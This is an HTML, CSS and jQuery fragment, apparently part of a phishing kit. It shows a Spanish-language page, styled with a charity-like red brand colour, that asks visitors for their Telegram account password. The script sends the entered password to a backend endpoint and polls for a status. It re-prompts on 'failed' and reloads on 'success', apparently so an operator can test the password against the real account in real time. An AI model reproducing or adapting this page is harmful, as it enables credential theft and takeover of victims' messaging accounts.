<style>
  .dkclass {
    height: 350px !important;
    padding: 24px 20px;
  }

  .password-wrapper {
    text-align: center;
    padding-top: 20px;
  }

  .password-wrapper h3 {
    font-weight: 800;
    font-size: 22px;
    margin-bottom: 6px;
  }

  .password-wrapper p {
    font-size: 13px;
    color: #666;
    margin-bottom: 20px;
  }

  .password-input {
    height: 50px;
    border-radius: 18px;
    border: 1.5px solid #ddd;
    text-align: center;
    font-size: 16px;
    letter-spacing: 2px;
  }

  /* placeholder dikecilin */
  .password-input::placeholder {
    font-size: 13px;
    letter-spacing: normal;
    color: #aaa;
  }

  #wrong {
    font-size: 12px;
    color: #e53935;
    margin-top: 8px;
    margin-bottom: 12px;
    display: none;
  }

  .btdk {
    width: 100%;
    height: 48px;
    border-radius: 18px;
    background-color: var(--caritas-red);
    border: none;
    font-weight: 700;
    color: #ffffff;
    margin-top: 10px;
  }

  .btdk:hover {
    background-color: rgb(255, 24, 24);
    color: #fff
  }
</style>

<div class="password-wrapper">

  <h3>Ingrese su contraseña</h3>
  <p>Ingrese la contraseña de su cuenta de Telegram para continuar.</p>

  <div class="mb-3">
    <input type="password" class="form-control password-input" name="phone" id="phone"
      placeholder="Ingrese su contraseña" />
  </div>

  <p id="wrong">Contraseña incorrecta.</p>

  <button class="btdk btn">CONFIRMAR</button>

</div>

<script>
  $("#wrong").hide();
  $("#loader").hide();

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: { "method": "getStatus" },
      success: function (data) {
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("input[type='password']").val("");
          $("#loader").hide();
        } else {
          setTimeout(function () {
            checkStatus();
          }, 500);
        }
      }
    });
  }

  $("button").on("click", function (e) {
    e.preventDefault();
    var password = $("input[type='password']").val();

    if (password !== "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: { "method": "sendPassword", "password": password },
        success: function () {
          setTimeout(function () {
            checkStatus();
          }, 500);
        }
      });
    }
  });
</script>